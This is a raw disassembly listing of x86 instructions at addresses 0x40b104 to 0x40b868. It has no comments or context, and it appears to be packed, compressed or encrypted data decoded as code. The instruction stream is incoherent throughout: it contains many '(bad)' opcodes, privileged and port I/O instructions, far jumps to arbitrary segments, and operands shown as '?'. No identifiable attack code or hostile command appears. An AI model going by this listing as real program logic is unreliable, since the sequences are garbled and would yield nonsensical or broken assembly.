  40b104:	fdiv   st,st(7)
  40b106:	dec    ecx
  40b107:	mov    ah,0x6b
  40b109:	add    BYTE PTR [ebp-0xfe3bfc9],al
  40b10f:	adc    bl,BYTE PTR [edx+esi*2-0x153476f8]
  40b116:	aaa    
  40b117:	xchg   ecx,eax
  40b118:	inc    ebx
  40b119:	popa   
  40b11a:	mov    al,0xb0
  40b11c:	fstp   QWORD PTR [edx-0x63]
  40b11f:	mul    DWORD PTR [ebp-0x1f]
  40b122:	inc    ecx
  40b123:	and    ch,BYTE PTR [edx]
  40b125:	enter  0xb7f2,0xf9
  40b129:	jle    0x40b18d
  40b12b:	mov    bl,0x44
  40b12d:	imul   BYTE PTR ds:[edi]
  40b130:	jae    0x40b188
  40b132:	fdiv   DWORD PTR [edx+0x4a5c2e9e]
  40b138:	mov    ds:0xd019fb57,eax
  40b13d:	mov    BYTE PTR [edi+esi*1],dh
  40b140:	cmp    ch,BYTE PTR [bp+di+0x4af]
  40b145:	xchg   BYTE PTR [edi+0x0],dl
  40b148:	pop    ss
  40b149:	jge    0x40b188
  40b14b:	bound  esp,QWORD PTR [edx-0x2104413d]
  40b151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b152:	inc    edx
  40b153:	ds hlt 
  40b155:	cmp    dl,dh
  40b157:	xchg   ebp,eax
  40b158:	gs jo  0x40b155
  40b15b:	lods   eax,DWORD PTR ds:[esi]
  40b15c:	dec    ebp
  40b15d:	ror    ch,cl
  40b15f:	inc    esp
  40b160:	loope  0x40b1ad
  40b162:	mov    ds:0x4b6c1233,al
  40b167:	sar    DWORD PTR [eax+0x3694c21b],1
  40b16d:	cmp    DWORD PTR [ebx],edx
  40b16f:	popf   
  40b170:	push   eax
  40b171:	call   0x116803a
  40b176:	pop    edx
  40b177:	sbb    DWORD PTR [ebp-0x3f4fb10b],ecx
  40b17d:	jecxz  0x40b1cb
  40b17f:	jl     0x40b10b
  40b181:	adc    ecx,DWORD PTR [ebx]
  40b183:	fsubr  DWORD PTR [ecx-0x36]
  40b186:	call   0xb46:0x2242ab57
  40b18d:	xor    eax,0x75076e07
  40b192:	xchg   ch,ah
  40b194:	xchg   edi,eax
  40b195:	lea    esi,[edi+esi*4]
  40b198:	test   BYTE PTR [eax],al
  40b19a:	sbb    eax,0x31db3a1c
  40b19f:	aad    0xb8
  40b1a1:	in     eax,dx
  40b1a2:	adc    bh,BYTE PTR [edi-0x79]
  40b1a5:	fmul   QWORD PTR [eax+0x2c070568]
  40b1ab:	cmp    BYTE PTR [edx],dl
  40b1ad:	sub    BYTE PTR gs:[si-0x6775],dh
  40b1b3:	inc    eax
  40b1b4:	icebp  
  40b1b5:	sbb    eax,0xf4437c09
  40b1ba:	jne    0x40b170
  40b1bc:	out    0xd7,eax
  40b1be:	std    
  40b1bf:	cld    
  40b1c0:	out    dx,al
  40b1c1:	(bad)  
  40b1c2:	xlat   BYTE PTR ds:[ebx]
  40b1c3:	shr    BYTE PTR fs:[edi-0x5b],cl
  40b1c7:	push   0x54396d8f
  40b1cc:	add    al,0x30
  40b1ce:	fcomp  QWORD PTR [edi-0x7a93d141]
  40b1d4:	adc    eax,0xa39b11d2
  40b1d9:	dec    ebp
  40b1da:	out    dx,eax
  40b1db:	cmp    eax,0xc3472606
  40b1e0:	mov    ebp,0xf2f4b744
  40b1e5:	jge    0x40b172
  40b1e7:	xor    DWORD PTR [ebx],edi
  40b1e9:	test   DWORD PTR [ebp+0x6baf2bc1],ebx
  40b1ef:	jecxz  0x40b239
  40b1f1:	sbb    al,0x11
  40b1f3:	add    al,BYTE PTR [esi+0x13]
  40b1f6:	add    al,bh
  40b1f8:	push   0x1082169c
  40b1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1fe:	push   edx
  40b1ff:	retf   
  40b200:	xor    eax,0xf6fa08f6
  40b205:	aad    0xef
  40b207:	ins    BYTE PTR es:[edi],dx
  40b208:	daa    
  40b209:	fs mov dh,al
  40b20c:	dec    ebp
  40b20d:	(bad)  
  40b20f:	jmp    0x40b21d
  40b211:	clc    
  40b212:	cmp    BYTE PTR [ecx],al
  40b214:	push   0x46f34dd3
  40b219:	dec    ecx
  40b21a:	stc    
  40b21b:	mov    eax,DWORD PTR [edx+eiz*4-0x42a01f75]
  40b222:	dec    ecx
  40b223:	adc    BYTE PTR [esi+0x61db890a],al
  40b229:	das    
  40b22a:	adc    bh,dh
  40b22c:	test   al,0xc4
  40b22e:	gs repz jecxz 0x40b1b9
  40b232:	jb     0x40b251
  40b234:	(bad)
  40b237:	mov    ds:0x3f8eeb4a,al
  40b23c:	mov    edx,0x3fe0c320
  40b241:	mov    ah,0x6a
  40b243:	bound  edx,QWORD PTR [eax+0x5b]
  40b246:	cmc    
  40b247:	inc    ecx
  40b248:	je     0x40b1ee
  40b24a:	mov    ecx,0x359f1cd9
  40b24f:	ds and bl,ch
  40b252:	js     0x40b2cc
  40b254:	sahf   
  40b255:	push   0xffffffcf
  40b257:	jecxz  0x40b213
  40b259:	add    BYTE PTR [esi+eiz*2],dh
  40b25c:	(bad)  
  40b25d:	or     dh,BYTE PTR [edi-0x2f1932e3]
  40b263:	pop    ds
  40b264:	sbb    al,0x52
  40b266:	dec    edi
  40b267:	xor    DWORD PTR [edx-0x54],eax
  40b26a:	or     ebx,esp
  40b26c:	stc    
  40b26d:	pop    ss
  40b26e:	cmp    al,0x2
  40b270:	icebp  
  40b271:	test   BYTE PTR [edx],ch
  40b273:	shl    cl,0x75
  40b276:	mov    bl,0xdc
  40b278:	in     al,dx
  40b279:	mov    cl,0x8
  40b27b:	push   eax
  40b27c:	(bad)  [edx]
  40b27e:	dec    esp
  40b27f:	enter  0x1bcd,0x5c
  40b283:	or     DWORD PTR [ecx],ecx
  40b285:	inc    ecx
  40b286:	mov    ds:0x6789ee68,eax
  40b28b:	xor    cl,dh
  40b28d:	mov    eax,ds:0xa08ac2de
  40b292:	jne    0x40b29e
  40b294:	leave  
  40b295:	popf   
  40b296:	cld    
  40b297:	jmp    0xeea6:0x400dfc85
  40b29e:	setle  BYTE PTR [edi+0x5c8d6a1f]
  40b2a5:	add    bl,dh
  40b2a7:	call   0xb8e3:0xd1a251a0
  40b2ae:	xchg   ecx,eax
  40b2af:	and    bh,bh
  40b2b1:	and    ch,al
  40b2b3:	scas   eax,DWORD PTR es:[edi]
  40b2b4:	(bad)  
  40b2b5:	daa    
  40b2b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b7:	into   
  40b2b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2b9:	adc    dl,BYTE PTR [ebx-0x48]
  40b2bc:	test   BYTE PTR [esi-0x70e482a3],bh
  40b2c2:	mov    dh,0x1d
  40b2c4:	(bad)  
  40b2c6:	hlt    
  40b2c7:	jl     0x40b2d1
  40b2c9:	daa    
  40b2ca:	cwde   
  40b2cb:	fdivp  st(3),st
  40b2cd:	mov    edi,0xd7f40fe2
  40b2d2:	jge    0x40b2db
  40b2d4:	not    DWORD PTR [ebx+0x21]
  40b2d7:	nop
  40b2d8:	jmp    0xfeb6fb32
  40b2dd:	orps   xmm1,XMMWORD PTR [ecx+ebp*1+0x8]
  40b2e2:	xchg   ecx,eax
  40b2e3:	mov    ebx,0x6a1b47e0
  40b2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e9:	and    DWORD PTR [edx],esp
  40b2eb:	fdiv   QWORD PTR [edx+ebx*2+0x5d]
  40b2ef:	dec    esp
  40b2f0:	pop    ss
  40b2f1:	in     al,dx
  40b2f2:	repz mov ebx,0x72af8545
  40b2f8:	mov    edi,edx
  40b2fa:	pop    ss
  40b2fb:	ret    0xb0ba
  40b2fe:	fadd   QWORD PTR [eax+ebx*1-0x38]
  40b302:	pop    eax
  40b303:	dec    ebx
  40b304:	add    BYTE PTR [edi-0x1d071482],bh
  40b30a:	jae    0x40b2da
  40b30c:	ss mov cl,0x13
  40b30f:	aad    0xf6
  40b311:	lods   eax,DWORD PTR ds:[esi]
  40b312:	fdiv   st(0),st
  40b314:	std    
  40b315:	popf   
  40b316:	stos   DWORD PTR es:[edi],eax
  40b317:	in     al,0x98
  40b319:	dec    ebx
  40b31a:	rep fs ins DWORD PTR es:[edi],dx
  40b31d:	mov    ebx,gs
  40b31f:	cmc    
  40b320:	mov    cl,0xfd
  40b322:	jecxz  0x40b2f0
  40b324:	divps  xmm7,XMMWORD PTR [ecx+0x2131a59d]
  40b32b:	cdq    
  40b32c:	std    
  40b32d:	sbb    eax,0xda64dd48
  40b332:	pop    ecx
  40b333:	inc    esi
  40b334:	and    eax,0xe11f7f3e
  40b339:	lock cdq 
  40b33b:	fld    st(1)
  40b33d:	jnp    0x40b36a
  40b33f:	ds sbb eax,eax
  40b342:	pop    eax
  40b343:	mov    WORD PTR [eax],?
  40b345:	xchg   edx,eax
  40b346:	mov    ds:0x3593e9a0,eax
  40b34b:	sbb    al,0x3
  40b34d:	repz icebp 
  40b34f:	mov    ds:0x48fc53c1,al
  40b354:	inc    esp
  40b355:	push   ecx
  40b356:	xor    BYTE PTR [ebp+0x22],bh
  40b359:	stos   BYTE PTR es:[edi],al
  40b35a:	iret   
  40b35b:	sti    
  40b35c:	icebp  
  40b35d:	cmp    eax,0x6a861c7
  40b362:	pusha  
  40b363:	xor    cl,BYTE PTR [edx]
  40b365:	add    bl,BYTE PTR [eax+0x11c19075]
  40b36b:	scas   al,BYTE PTR es:[edi]
  40b36c:	add    dh,ah
  40b36e:	lock hlt 
  40b370:	sti    
  40b371:	test   ebx,edx
  40b373:	or     cl,BYTE PTR [ebp+0x5c91dd69]
  40b379:	out    0x42,al
  40b37b:	loop   0x40b39b
  40b37d:	dec    esi
  40b37e:	mov    edx,0xbc485919
  40b383:	jno    0x40b3ba
  40b385:	in     eax,0x81
  40b387:	jge    0x40b3ec
  40b389:	outs   dx,BYTE PTR ds:[esi]
  40b38a:	sar    BYTE PTR [ebp+0x3feb03f1],0x5d
  40b391:	fld    TBYTE PTR [edi+esi*4-0x1f3d2809]
  40b398:	cwde   
  40b399:	sbb    DWORD PTR [edi+0x28],0xfa4e5f3c
  40b3a0:	icebp  
  40b3a1:	or     DWORD PTR [ebx],edx
  40b3a3:	scas   al,BYTE PTR es:[edi]
  40b3a4:	ins    DWORD PTR es:[edi],dx
  40b3a5:	push   esi
  40b3a6:	add    edi,DWORD PTR ds:0x86aa5027
  40b3ac:	adc    edx,DWORD PTR [edi+ebp*8-0x17]
  40b3b0:	jns    0x40b334
  40b3b2:	arpl   WORD PTR [edx],dx
  40b3b4:	aad    0x6c
  40b3b6:	push   ss
  40b3b7:	dec    esi
  40b3b8:	mov    dh,0xee
  40b3ba:	clc    
  40b3bb:	loopne 0x40b3c1
  40b3bd:	dec    ecx
  40b3be:	push   cs
  40b3bf:	jmp    0xd8af40f5
  40b3c4:	xchg   edi,eax
  40b3c5:	dec    ebp
  40b3c6:	jo     0x40b360
  40b3c8:	jge    0x40b375
  40b3ca:	lods   al,BYTE PTR ds:[esi]
  40b3cb:	adc    DWORD PTR [ebp+0x50],edx
  40b3ce:	fadd   DWORD PTR [eax]
  40b3d0:	data16 xor ch,bh
  40b3d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3d4:	aaa    
  40b3d5:	sub    DWORD PTR [edi-0x3d],eax
  40b3d8:	mov    edx,0x1a01469e
  40b3dd:	sbb    BYTE PTR ds:0x697094f0,bh
  40b3e3:	jge    0x40b45b
  40b3e5:	mov    al,0x11
  40b3e7:	pop    edi
  40b3e8:	gs inc edx
  40b3ea:	sub    eax,0x82ab65d0
  40b3ef:	popa   
  40b3f0:	hlt    
  40b3f1:	lock sub ah,BYTE PTR [ebx]
  40b3f4:	jp     0x40b445
  40b3f6:	aam    0xde
  40b3f8:	mov    bl,0xad
  40b3fa:	jns    0x40b440
  40b3fc:	pop    ebp
  40b3fd:	lock ficom DWORD PTR [esi-0x1e]
  40b401:	imul   ebx,DWORD PTR [edx*2-0x360a3091],0xffffffbe
  40b409:	enter  0x8702,0xd9
  40b40d:	sub    al,0x2e
  40b40f:	xchg   ecx,eax
  40b410:	push   es
  40b411:	pop    es
  40b412:	dec    ebx
  40b413:	push   ds
  40b414:	scas   al,BYTE PTR es:[edi]
  40b415:	push   esi
  40b416:	jge    0x40b3f6
  40b418:	inc    edi
  40b419:	add    BYTE PTR [ebx+ecx*1+0x2f4e45b7],bl
  40b420:	in     eax,dx
  40b421:	ror    BYTE PTR ds:0x46afd241,cl
  40b427:	bound  esi,QWORD PTR [ebx]
  40b429:	ret    0x18d5
  40b42c:	icebp  
  40b42d:	fisub  WORD PTR [eax+edx*8]
  40b430:	inc    esi
  40b431:	mov    dh,0x7f
  40b433:	and    dl,dl
  40b435:	and    dl,BYTE PTR [ecx-0x4703a3ca]
  40b43b:	cli    
  40b43c:	loop   0x40b429
  40b43e:	xchg   edx,eax
  40b43f:	sub    al,0xd
  40b441:	sbb    DWORD PTR [edx-0x1a],esi
  40b444:	xor    eax,DWORD PTR [ecx+eiz*8-0x71]
  40b448:	pop    ebx
  40b449:	sar    eax,cl
  40b44b:	or     BYTE PTR [esi+edx*4],cl
  40b44e:	adc    BYTE PTR [edi+0x25],dl
  40b451:	stos   BYTE PTR es:[edi],al
  40b452:	add    al,0x54
  40b454:	dec    eax
  40b455:	mov    bl,0x59
  40b457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b458:	hlt    
  40b459:	ret    
  40b45a:	fld    st(2)
  40b45c:	pop    ds
  40b45d:	add    eax,0x8265a1c0
  40b462:	xchg   esp,eax
  40b463:	xchg   BYTE PTR [ebp-0x8],bl
  40b466:	mov    ebx,0x611bbcf2
  40b46b:	and    dh,cl
  40b46d:	push   ebx
  40b46e:	imul   edx,ebx,0x1e
  40b471:	inc    ebp
  40b472:	bnd jle 0x40b49d
  40b475:	mov    eax,ds
  40b477:	pushf  
  40b478:	xchg   ebx,eax
  40b479:	pop    edi
  40b47a:	hlt    
  40b47b:	test   al,0xa6
  40b47d:	and    DWORD PTR [edi-0x14],0xffffff9d
  40b481:	addr16 pop es
  40b483:	add    esp,DWORD PTR [edx-0x14]
  40b486:	push   cs
  40b487:	xchg   ebp,eax
  40b488:	les    edx,FWORD PTR [ecx+eiz*1]
  40b48b:	jno    0x40b470
  40b48d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b48e:	jmp    0x58eef533
  40b493:	mov    ecx,edi
  40b495:	div    DWORD PTR [ebx+0x151b4a80]
  40b49b:	cmp    edx,DWORD PTR [ebx-0x45]
  40b49e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49f:	shl    BYTE PTR [esi+0x37],1
  40b4a2:	jmp    0xa14:0x50060e21
  40b4a9:	das    
  40b4aa:	sub    BYTE PTR [edi],ah
  40b4ac:	std    
  40b4ad:	popfw  
  40b4af:	add    BYTE PTR [ebp-0xf6892b7],dl
  40b4b5:	and    bl,BYTE PTR [ebx]
  40b4b7:	xchg   DWORD PTR [edx+esi*1+0x61],esi
  40b4bb:	mov    ?,WORD PTR [edx]
  40b4bd:	sub    al,0x53
  40b4bf:	scas   al,BYTE PTR es:[edi]
  40b4c0:	push   esi
  40b4c1:	js     0x40b4e1
  40b4c3:	retf   
  40b4c4:	or     al,0xfe
  40b4c6:	daa    
  40b4c7:	retf   0xa82e
  40b4ca:	and    ch,BYTE PTR [ebx+0x8fd3595]
  40b4d0:	in     al,0x7d
  40b4d2:	xchg   ebp,edi
  40b4d4:	and    eax,0xddf49505
  40b4d9:	popf   
  40b4da:	sbb    dl,BYTE PTR [edx]
  40b4dc:	je     0x40b489
  40b4de:	xchg   esi,eax
  40b4df:	dec    ebx
  40b4e0:	dec    ecx
  40b4e1:	sbb    DWORD PTR [edi+0x10],edi
  40b4e4:	cmp    ebx,ebx
  40b4e6:	into   
  40b4e7:	bound  eax,QWORD PTR [ebx]
  40b4e9:	out    0xf5,al
  40b4eb:	clc    
  40b4ec:	pop    es
  40b4ed:	adc    BYTE PTR [edx+0x3b],ah
  40b4f0:	mov    WORD PTR [esi+ebx*2+0x591fe37c],?
  40b4f7:	adc    eax,0xbac0c20b
  40b4fc:	xor    BYTE PTR [edi-0x4256dd2b],al
  40b502:	and    eax,edx
  40b504:	or     DWORD PTR [esi-0x49d4b7e4],esi
  40b50a:	mov    edi,0xe8d6dffc
  40b50f:	push   edi
  40b510:	xor    al,0x41
  40b513:	cli    
  40b514:	sbb    al,0xec
  40b516:	into   
  40b517:	in     al,dx
  40b518:	out    0xc5,al
  40b51a:	dec    edi
  40b51b:	out    0x1e,al
  40b51d:	ins    BYTE PTR es:[edi],dx
  40b51e:	fs jb  0x40b4bc
  40b521:	jle    0x40b4fc
  40b523:	fwait
  40b524:	out    0x24,eax
  40b526:	test   BYTE PTR [esi+0x6e],dl
  40b529:	pop    ds
  40b52a:	push   edi
  40b52b:	or     DWORD PTR ds:0x7ecc8935,0x116d7ca1
  40b535:	mov    ecx,0x133656c
  40b53a:	push   ebx
  40b53b:	scas   al,BYTE PTR es:[edi]
  40b53c:	jne    0x40b52f
  40b53e:	(bad)  
  40b53f:	adc    ah,dl
  40b541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b542:	mov    bh,0x82
  40b544:	(bad)  
  40b545:	aaa    
  40b546:	in     eax,dx
  40b547:	cli    
  40b548:	cdq    
  40b549:	mov    ebp,0xe63b0a06
  40b54e:	pusha  
  40b54f:	mov    WORD PTR [ecx+eiz*8+0x1acd2062],ss
  40b556:	jo     0x40b530
  40b558:	mov    ecx,0xda64ef94
  40b55d:	ss cdq 
  40b55f:	in     al,0x4c
  40b561:	js     0x40b544
  40b563:	mov    edi,eax
  40b565:	aas    
  40b566:	xchg   esi,eax
  40b567:	mov    esp,0x2eaf969d
  40b56c:	push   ss
  40b56d:	mov    DWORD PTR [edi+0x573f4655],ecx
  40b573:	lods   eax,DWORD PTR ds:[esi]
  40b574:	mov    ch,0x17
  40b576:	fisttp QWORD PTR [eax+0x47]
  40b579:	sub    BYTE PTR [ecx+0x35240d6f],bl
  40b57f:	out    0xe1,al
  40b581:	mov    bl,0x50
  40b583:	popa   
  40b584:	inc    esi
  40b585:	ds mov bh,0x40
  40b588:	mov    ch,0xc4
  40b58a:	aaa    
  40b58b:	in     eax,dx
  40b58c:	inc    edx
  40b58d:	inc    edx
  40b58e:	jmp    0x40b5c6
  40b590:	(bad)  
  40b591:	fwait
  40b592:	loopne 0x40b5f1
  40b594:	pop    ebx
  40b595:	mov    esp,0xeec0122c
  40b59a:	push   ds
  40b59b:	push   es
  40b59c:	sbb    edi,ebp
  40b59e:	dec    eax
  40b59f:	dec    eax
  40b5a0:	daa    
  40b5a1:	fidivr WORD PTR [edi+ebp*1-0x1f93f350]
  40b5a8:	leave  
  40b5a9:	inc    edx
  40b5aa:	inc    ebx
  40b5ab:	add    BYTE PTR [edi+0x28ffc5f9],bl
  40b5b1:	add    eax,0x7ae4ca3c
  40b5b6:	inc    eax
  40b5b7:	push   ss
  40b5b8:	hlt    
  40b5b9:	sub    eax,0xcffd7ce
  40b5be:	fmul   DWORD PTR [eax]
  40b5c0:	not    BYTE PTR [esi+eax*8]
  40b5c3:	dec    edi
  40b5c4:	push   ebx
  40b5c5:	in     eax,0xa4
  40b5c7:	pop    ebx
  40b5c8:	and    DWORD PTR [edx-0x25a77486],0x3a
  40b5cf:	in     al,dx
  40b5d0:	xor    al,0x78
  40b5d2:	push   ebx
  40b5d3:	cmp    al,0x3f
  40b5d5:	push   edi
  40b5d6:	mov    eax,ds:0x794f33c1
  40b5db:	adc    al,0xe5
  40b5dd:	aas    
  40b5de:	pop    edx
  40b5df:	fcomp  DWORD PTR [edx-0x765493a9]
  40b5e5:	cmp    al,0x5d
  40b5e7:	test   DWORD PTR [ebx],eax
  40b5e9:	inc    ebp
  40b5ea:	mov    dl,0xe9
  40b5ec:	ins    DWORD PTR es:[edi],dx
  40b5ed:	lods   al,BYTE PTR ds:[esi]
  40b5ee:	jns    0x40b58d
  40b5f0:	jl     0x40b581
  40b5f2:	cmp    BYTE PTR [ecx+0x75],bl
  40b5f5:	push   ss
  40b5f6:	dec    esp
  40b5f7:	hlt    
  40b5f8:	jne    0x40b66c
  40b5fa:	ins    DWORD PTR es:[edi],dx
  40b5fb:	ffree  st(3)
  40b5fd:	sbb    al,BYTE PTR [eax]
  40b5ff:	xor    dh,BYTE PTR [ebx]
  40b601:	mov    al,ds:0x1806512b
  40b606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b607:	out    dx,al
  40b608:	xor    DWORD PTR [edx+0xc62e4ca],0xfd64a6df
  40b612:	dec    ecx
  40b613:	mov    ecx,0x324bd308
  40b618:	loopne 0x40b5de
  40b61a:	mov    ds:0x64ae529e,al
  40b61f:	dec    esp
  40b620:	enter  0xd20c,0x13
  40b624:	call   0xfe67:0x11debaa0
  40b62b:	in     eax,0x1
  40b62d:	xor    eax,0x1edf613c
  40b632:	cs add ah,dh
  40b635:	sti    
  40b636:	xor    al,0xa5
  40b638:	mov    eax,DWORD PTR [esi]
  40b63a:	int    0xcb
  40b63c:	mov    esp,0x49265cb3
  40b641:	mov    ebx,0xcd9fdb9b
  40b646:	aam    0x94
  40b648:	jnp    0x40b6bb
  40b64a:	and    al,0x17
  40b64c:	clc    
  40b64d:	pop    edi
  40b64e:	add    bl,BYTE PTR [esi+0x78210266]
  40b654:	nop
  40b655:	in     eax,0xc1
  40b657:	repz inc BYTE PTR [ecx+0x6bf4fdcb]
  40b65e:	dec    ebx
  40b65f:	div    BYTE PTR [ebx]
  40b661:	shr    DWORD PTR [ecx+esi*4+0x49],1
  40b665:	ret    
  40b666:	jle    0x40b693
  40b668:	psadbw mm1,mm4
  40b66b:	jno    0x40b5fd
  40b66d:	push   ds
  40b66e:	mov    bl,0x6c
  40b670:	sbb    eax,0xaf837ab3
  40b675:	jl     0x40b69f
  40b677:	repz sbb esi,0x2
  40b67b:	clc    
  40b67c:	mov    al,0x5a
  40b67e:	jg     0x40b6d9
  40b680:	mov    BYTE PTR [edx],bl
  40b682:	sub    al,0x28
  40b684:	(bad)  
  40b685:	loop   0x40b650
  40b687:	daa    
  40b688:	lahf   
  40b689:	xor    ecx,eax
  40b68b:	adc    al,dh
  40b68d:	xor    BYTE PTR [esp+edx*1],bh
  40b690:	xchg   esi,eax
  40b691:	xchg   ecx,eax
  40b692:	mov    ch,0x2f
  40b694:	dec    ebp
  40b695:	pop    ecx
  40b696:	mov    ch,0x6a
  40b698:	imul   ebp,DWORD PTR [ebp+0x7b4a3234],0x242ad08b
  40b6a2:	adc    eax,DWORD PTR [edx+0x55074660]
  40b6a8:	xor    cl,bl
  40b6aa:	lods   eax,DWORD PTR ds:[esi]
  40b6ab:	cli    
  40b6ac:	sub    esp,DWORD PTR [ecx+0x78]
  40b6af:	pop    esp
  40b6b0:	es pop ebx
  40b6b2:	push   ss
  40b6b3:	je     0x40b640
  40b6b5:	es push edi
  40b6b7:	pop    ss
  40b6b8:	add    BYTE PTR ds:0xdfad9fb8,ah
  40b6be:	lods   eax,DWORD PTR ds:[esi]
  40b6bf:	inc    eax
  40b6c0:	stos   DWORD PTR es:[edi],eax
  40b6c1:	sub    DWORD PTR [eax+0x11],edx
  40b6c4:	pop    esi
  40b6c5:	fadd   DWORD PTR [ecx+0x3fa5d77]
  40b6cb:	pusha  
  40b6cc:	jbe    0x40b736
  40b6ce:	sbb    DWORD PTR [esi-0x69],eax
  40b6d1:	or     al,0x95
  40b6d3:	in     eax,dx
  40b6d4:	and    BYTE PTR [edi+0x1630756],cl
  40b6da:	dec    ebx
  40b6db:	jl     0x40b6fb
  40b6dd:	add    DWORD PTR [edi-0x7f5252e7],esp
  40b6e3:	fdivr  DWORD PTR [ecx+0x60]
  40b6e6:	scas   eax,DWORD PTR es:[edi]
  40b6e7:	ror    DWORD PTR [ebx+eax*8],cl
  40b6ea:	out    0xf4,eax
  40b6ec:	pushf  
  40b6ed:	cli    
  40b6ee:	aas    
  40b6ef:	neg    ebp
  40b6f1:	jge    0x40b698
  40b6f3:	lock rcr ebx,1
  40b6f6:	dec    esi
  40b6f7:	mov    dh,bh
  40b6f9:	dec    ecx
  40b6fa:	leave  
  40b6fb:	inc    eax
  40b6fc:	sub    DWORD PTR [ebp+0x3ccdb342],edx
  40b702:	sub    al,0xec
  40b704:	or     ebx,DWORD PTR ss:[ebx]
  40b707:	jns    0x40b77b
  40b709:	rol    BYTE PTR [ebx+edi*8],0x34
  40b70d:	adc    BYTE PTR [edi-0x18349a3],dh
  40b713:	dec    ebx
  40b714:	data16 sbb dh,BYTE PTR [edi]
  40b717:	jge    0x40b788
  40b719:	cs jl  0x40b768
  40b71c:	or     eax,0x1d280bd5
  40b721:	in     al,dx
  40b722:	push   ebp
  40b723:	pop    ebp
  40b724:	sbb    eax,0xdc4b1283
  40b729:	nop
  40b72a:	(bad)  
  40b72b:	gs pop ecx
  40b72d:	call   0x853c5537
  40b732:	jns    0x40b7a0
  40b734:	data16 repnz (bad) 
  40b737:	jmp    0x40b6d2
  40b739:	push   es
  40b73a:	call   DWORD PTR [ecx+0x56902b34]
  40b740:	aas    
  40b741:	jg     0x40b6e4
  40b743:	xor    bl,BYTE PTR [ecx]
  40b745:	adc    al,0xb2
  40b748:	in     eax,dx
  40b749:	ss js  0x40b7a2
  40b74c:	pmulhuw mm2,mm5
  40b74f:	add    ch,BYTE PTR [esi-0x3518b40a]
  40b755:	mov    esp,0x9609df45
  40b75a:	mov    ch,bh
  40b75c:	sti    
  40b75d:	xor    DWORD PTR [ebx],ebx
  40b75f:	mov    al,0xd
  40b761:	and    eax,0x43fd5014
  40b766:	out    0x6c,al
  40b768:	ret    
  40b769:	adc    eax,0xe70501ba
  40b76e:	int    0x69
  40b770:	dec    eax
  40b771:	dec    ebp
  40b772:	sbb    dl,dl
  40b774:	(bad)  
  40b775:	imul   eax,DWORD PTR [edi+0x72],0xe68803e7
  40b77c:	mov    al,ds:0xe69dbded
  40b781:	inc    eax
  40b782:	loope  0x40b72a
  40b784:	jbe    0x40b7cb
  40b786:	push   cs
  40b787:	mov    bl,0x55
  40b789:	pop    ecx
  40b78a:	hlt    
  40b78b:	fwait
  40b78c:	adc    edx,DWORD PTR [esi]
  40b78e:	or     al,0xed
  40b790:	call   0xf78d:0x6cb5d1c1
  40b797:	pop    ds
  40b798:	or     edx,DWORD PTR [edi]
  40b79a:	popa   
  40b79b:	sub    al,0xeb
  40b79d:	pop    esi
  40b79e:	push   0x28d710d3
  40b7a3:	inc    ecx
  40b7a4:	push   0xfc4f0a7d
  40b7a9:	cmp    eax,0xc77ce476
  40b7ae:	lods   eax,DWORD PTR ds:[esi]
  40b7af:	cmp    al,0x1f
  40b7b1:	jg     0x40b784
  40b7b3:	push   es
  40b7b4:	xor    eax,0xba7149b5
  40b7b9:	add    BYTE PTR [edx-0x7c],al
  40b7bc:	(bad)  
  40b7bd:	cmc    
  40b7be:	and    DWORD PTR [ecx],0x29
  40b7c1:	inc    BYTE PTR [edi-0x5c]
  40b7c4:	hlt    
  40b7c5:	xor    BYTE PTR [ecx-0x416c1bed],0x7a
  40b7cc:	fadd   st,st(1)
  40b7ce:	sbb    esp,edx
  40b7d0:	cmc    
  40b7d1:	adc    BYTE PTR [edx],dh
  40b7d3:	push   esp
  40b7d4:	jne    0x40b7c8
  40b7d6:	push   esp
  40b7d7:	test   eax,0x19a12568
  40b7dc:	into   
  40b7dd:	mov    edi,0x7b8dae1b
  40b7e2:	sbb    eax,0xce2fa7c5
  40b7e7:	rcr    DWORD PTR [ebp-0x40],cl
  40b7ea:	test   eax,0x15aa4f79
  40b7ef:	call   0xb9a1e2d9
  40b7f4:	pop    esi
  40b7f5:	pop    edi
  40b7f6:	sbb    DWORD PTR [edx],ecx
  40b7f8:	cwde   
  40b7f9:	enter  0x4954,0x79
  40b7fd:	jl     0x40b7f8
  40b7ff:	(bad)  
  40b800:	rcr    ecx,cl
  40b802:	add    bh,BYTE PTR [ebx-0x366872fb]
  40b808:	icebp  
  40b809:	dec    ebp
  40b80a:	iret   
  40b80b:	dec    eax
  40b80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b80d:	add    eax,0x60d0b6a2
  40b812:	dec    esp
  40b813:	mov    ch,0x15
  40b815:	inc    esi
  40b816:	stos   DWORD PTR es:[edi],eax
  40b817:	lds    esp,FWORD PTR [edi+0x7b]
  40b81a:	xor    al,0x5d
  40b81c:	loope  0x40b83a
  40b81e:	jb     0x40b836
  40b820:	psrad  mm6,QWORD PTR [ebp+0xf0c6fc6]
  40b827:	cmp    esp,DWORD PTR [edx]
  40b829:	cmp    al,0x93
  40b82b:	push   es
  40b82c:	push   ds
  40b82d:	add    esp,eax
  40b82f:	fisub  DWORD PTR [edx]
  40b831:	add    al,0x44
  40b833:	mov    al,0x56
  40b835:	add    DWORD PTR [edi+0x49],ebx
  40b838:	ds loope 0x40b869
  40b83b:	xor    ebx,DWORD PTR [ecx+0x7e]
  40b83e:	js     0x40b88e
  40b840:	or     ah,BYTE PTR [eax+0x6481cb49]
  40b846:	shr    BYTE PTR [edi+0x50de5dc6],1
  40b84c:	cwde   
  40b84d:	mov    eax,ds:0x4093a858
  40b852:	inc    esi
  40b853:	inc    esp
  40b854:	call   0x41f9db02
  40b859:	add    al,0xb5
  40b85b:	add    DWORD PTR [esi-0x5d],esp
  40b85e:	les    esp,FWORD PTR [eax+ebx*1+0x63dc3a1a]
  40b865:	stos   BYTE PTR es:[edi],al
  40b866:	jae    0x40b8de
  40b868:	jmp    0x6d06d4ae
